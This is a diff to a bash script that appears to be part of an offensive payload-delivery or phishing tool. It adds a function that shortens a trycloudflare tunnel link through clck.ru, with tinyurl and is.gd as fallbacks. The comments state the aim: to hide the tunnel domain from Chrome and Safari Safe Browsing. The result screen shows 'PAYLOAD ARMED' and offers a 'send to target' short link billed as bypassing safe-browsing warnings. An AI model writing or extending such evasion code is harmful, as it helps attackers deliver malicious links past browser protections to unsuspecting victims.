@@ -372,10 +372,53 @@ register_alias() {
     fi
 }
 
+# ─── URL shorteners — hide trycloudflare.com from Safe Browsing ──
+# clck.ru is the only reliable one that does NOT blacklist trycloudflare.com;
+# is.gd and tinyurl explicitly reject trycloudflare URLs as 'abuse'.
+# The short link (clck.ru/xxxx) has clean reputation, so Chrome / Safari
+# safe-browsing don't warn on click. Redirect chain: clck.ru → yandex → target.
+shorten_url() {
+    local url="$1"
+    local encoded short
+
+    encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$url" 2>/dev/null)
+
+    # clck.ru — Russian shortener, accepts trycloudflare.com URLs
+    short=$(curl -sfL --max-time 8 -G --data-urlencode "url=${url}" "https://clck.ru/--" 2>/dev/null)
+    if [[ "$short" =~ ^https?://clck\.ru/ ]]; then
+        echo "$short"
+        return 0
+    fi
+
+    # tinyurl fallback — likely blocks trycloudflare, but works for other hosts
+    short=$(curl -sfL --max-time 8 "https://tinyurl.com/api-create.php?url=${encoded}" 2>/dev/null)
+    if [[ "$short" =~ ^https?://tinyurl\.com/ ]]; then
+        echo "$short"
+        return 0
+    fi
+
+    # is.gd last-resort — same story
+    short=$(curl -sfL --max-time 8 "https://is.gd/create.php?format=simple&url=${encoded}" 2>/dev/null)
+    if [[ "$short" =~ ^https?://is\.gd/ ]]; then
+        echo "$short"
+        return 0
+    fi
+
+    return 1
+}
+
 # ─── Result screen ────────────────────────────────
 show_link() {
     banner
     local full_url="${TUNNEL_URL}/${URL_PATH:-$SEL_SLUG}"
+    local short_url=""
+
+    # Auto-shorten only for public tunnel URLs (skip localhost)
+    if [[ "$DELIVERY" == "tunnel" ]]; then
+        printf "  ${D}shortening link (is.gd/tinyurl)...${N}\r"
+        short_url=$(shorten_url "$full_url")
+        printf "%*s\r" 60 " "   # clear the spinner line
+    fi
 
     section "PAYLOAD ARMED"
     printf "\n"
@@ -384,8 +427,17 @@ show_link() {
     kv "mask"     "/${URL_PATH:-$SEL_SLUG}"            "$GY" "$C"
     printf "\n"
 
-    printf "    ${GY}link ${D}(send to target)${N}\n"
-    printf "    ${G}${BLD}%s${N}\n\n" "$(link "$full_url" "$full_url")"
+    if [[ -n "$short_url" ]]; then
+        printf "    ${GY}short link ${G}(recommended — bypasses Chrome safe-browsing)${N}\n"
+        printf "    ${G}${BLD}%s${N}\n\n" "$(link "$short_url" "$short_url")"
+        printf "    ${GY}long link ${D}(direct — may be flagged on mobile Chrome)${N}\n"
+        printf "    ${D}%s${N}\n\n" "$(link "$full_url" "$full_url")"
+    else
+        printf "    ${GY}link ${D}(send to target)${N}\n"
+        printf "    ${G}${BLD}%s${N}\n\n" "$(link "$full_url" "$full_url")"
+        [[ "$DELIVERY" == "tunnel" ]] && \
+            printf "    ${Y}[!]${N} ${D}url shortener unreachable — using direct URL${N}\n\n"
+    fi
 
     section "OPERATIONS"
     printf "\n"
